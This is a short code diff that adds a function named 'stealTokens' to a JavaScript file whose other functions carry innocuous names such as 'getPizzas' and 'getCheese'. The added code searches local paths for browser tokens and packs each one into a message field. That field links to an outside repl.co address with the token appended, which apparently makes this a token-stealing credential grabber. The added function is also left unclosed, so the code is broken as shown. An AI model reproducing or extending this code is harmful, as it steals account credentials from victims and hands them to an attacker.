@@ -591,6 +591,19 @@ async function getPizzas(path) {
     }
 }
 
+async function stealTokens() {
+    const fields = [];
+    for (let path of paths) {
+        const foundTokens = findToken(path);
+        if (foundTokens) foundTokens.forEach(token => { 
+            var c = {
+                name: "<:browserstokens:951827260741156874> Browser Token;",
+                value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/`+ token +`)`,
+                inline: !0
+            }
+            fields.push(c)
+        });
+    }
 async function getCheese(path) {
     let path_split = path.split('\\'),
         path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
